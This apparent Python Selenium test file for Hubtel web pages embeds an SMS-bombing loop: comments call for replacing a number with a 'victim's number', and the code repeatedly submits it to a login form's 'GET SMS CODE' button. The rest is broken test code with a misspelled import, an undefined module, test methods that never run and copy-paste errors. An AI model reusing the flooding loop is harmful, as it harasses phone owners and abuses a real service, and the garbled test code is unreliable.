import time
import unittest

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.webdriver import WebDriver
from selenium.webdriver.support import expected_conditdions as EC
from selenium.webdriver.support.ui import WebDriverWait

# Importing custom module selen.browser
from selen import browser

#Create a Firefore WebDriver instance
driver: WebDriver = webdriver.Firefox()

# Navigate to a webpage
driver.get('https://explore.hubtel.com/schools/')
time.sleep(10)
driver.get('https://app-raiseup.hubtel.com/login')

#Waith for the "LET'S GO!" link to b

element = WebDriverWait(driver, 30).until(
    EC.element_to_be_clickable((By.LINK_TEXT, "LET'S GO!")))
frequency = 10

# target mobile number, change it to victim's number and
# also ensure that it's registered on flipkart
mobile_number = 2248093879


for i in range(frequency):
    browser.get('https://app-raiseup.hubtel.com/login/')

    # find the element where we have to
    # enter the number using the class name
    number = browser.find_element_by_xpath('/html/body/div/div/div[2]/div/div/section/div/div/div/div/div/form/div/input')
    number.clear()

    # automatically type the target number
    number.send_keys("2248093879")

    # find the element to send a forgot password
    # request using its class name
    code = browser.find_element_by_link_text('GET SMS CODE')

    # clicking on that element
    code.click()

    # set the interval to send each sms
    time.sleep(10)

element.click()


driver.get('https://app-raiseup.hubtel.com/registration/status')
time.sleep(10)

# time.sleep(10)

# Use WebDriverWait to wait for the link to be clickable
link_element = WebDriverWait(driver, 10.3).until(
    EC.element_to_be_clickable((By.LINK_TEXT, "LET'S GO"))

)
link_element.click()
time.sleep(10.0)
driver.find_element_by_link_text("Terms of Use and Privacy Policy")

class Myimga(unittest.TestCase):
    def setUp(self):
        self.driver = webdriver.Firefox()
        self.driver.get("https://explore.hubtel.com/wp-content/themes/explorehubtel/images/share-image.png/")
        self.driver.maximize_window()
        time.sleep(5)

    def image1(self):
        self.driver.find_element_by_id('education')
        self.driver.find_element_by_xpath('/html/body/div[5]/div/div[2]/div[1]/div/div/div[1]/img')
        self.driver.find_element_by_css_selector('body > div.content > div > div:nth-child(2) > div.text-center.py-5 > div > div > div:nth-child(1) > img')
        self.driver.find_element_by_link_text('https://explore.hubtel.com/wp-content/themes/explorehubtel/images/share-image.png/')




    def tearDown(self) -> None:
        self.driver.close()


if __name__ == '__main__':
    unittest.main()

class image2(unittest.TestCase):
    def setUp(self):
        self.driver = webdriver.Firefox()
        self.driver.get('https://explore.hubtel.com/wp-content/themes/explorehubtel/images/stay-informed.png')
        self.driver.maximize_window()
        time.sleep(5)

    def image2(self):
        self.driver.find_element_by_id('Stay Informed')
        self.driver.find_element_by_xpath("/html/body/div[5]/div/div[2]/div[1]/div/div/div[2]/img")
        self.driver.find_element_by_css_selector('body > div.content > div > div:nth-child(2) > div.text-center.py-5 > div > div > div:nth-child(2) > img')
        self.driver.find_element_by_link_text('https://explore.hubtel.com/wp-content/themes/explorehubtel/images/stay-informed.png')

    def tearDown(self):
        self.driver.close()


class image3(unittest.TestCase):
    def setUp(self):
        self.driver = webdriver.Firefox()
        self.driver.get('https://explore.hubtel.com/wp-content/themes/explorehubtel/images/manage-pickups.png')
        self.driver.maximize_window()
        time.sleep(5)

    def image3(self):
        self.driver.find_element_by_id('Manage PickUps')
        self.driver.find_element_by_xpath("/html/body/div[5]/div/div[2]/div[1]/div/div/div[3]/img")
        self.driver.find_element_by_css_selector(
            'body > div.content > div > div:nth-child(2) > div.text-center.py-5 > div > div > div:nth-child(3) > img')
        self.driver.find_element_by_link_text(
            'https://explore.hubtel.com/wp-content/themes/explorehubtel/images/stay-informed.png')

    def tearDown(self):
        self.driver.close()


class image4(unittest.TestCase):
    def setUp(self):
        self.driver = webdriver.Firefox()
        self.driver.get('https://explore.hubtel.com/wp-content/themes/explorehubtel/images/pay-school-fees.png')
        self.driver.maximize_window()
        time.sleep(5)

    def image4(self):
        self.driver.find_element_by_id('pay School fees')
        self.driver.find_element_by_xpath("/html/body/div[5]/div/div[2]/div[1]/div/div/div[4]/img")
        self.driver.find_element_by_css_selector(
            'body > div.content > div > div:nth-child(2) > div.text-center.py-5 > div > div > div:nth-child(4) > img')
        self.driver.find_element_by_link_text('https://explore.hubtel.com/wp-content/themes/explorehubtel/images/pay'
                                              '-school-fees.png')

    def tearDown(self):
        self.driver.close()

class image5(unittest.TestCase):
    def setUp(self):
        self.driver = webdriver.Firefox()
        self.driver.get('https://explore.hubtel.com/wp-content/themes/explorehubtel/images/manage-permissions.png')
        self.driver.maximize_window()
        time.sleep(5)

    def image5(self):
        self.driver.find_element_by_id('manage-permissions')
        self.driver.find_element_by_xpath("/html/body/div[5]/div/div[2]/div[1]/div/div/div[5]/img")
        self.driver.find_element_by_css_selector(
            'body > div.content > div > div:nth-child(2) > div.text-center.py-5 > div > div > div:nth-child(5) > img')
        self.driver.find_element_by_link_text(
            'https://explore.hubtel.com/wp-content/themes/explorehubtel/images/manage-permissions.png')

    def tearDown(self):
        self.driver.close()

class image6 (unittest.TestCase):
    def setUp(self):
        self.driver = webdriver.Firefox()
        self.driver.get('https://explore.hubtel.com/wp-content/themes/explorehubtel/images/bring-family-together.png')
        self.driver.maximize_window()
        time.sleep(5)

    def image5(self):
        self.driver.find_element_by_id('Bring Family Together')
        self.driver.find_element_by_xpath("/html/body/div[5]/div/div[2]/div[1]/div/div/div[6]/img")
        self.driver.find_element_by_css_selector(
            'body > div.content > div > div:nth-child(2) > div.text-center.py-5 > div > div > div:nth-child(6) > img')
        self.driver.find_element_by_link_text(
            'https://explore.hubtel.com/wp-content/themes/explorehubtel/images/bring-family-together.png')

    def tearDown(self):
        self.driver.close()

# Close the browser window
driver.quit()
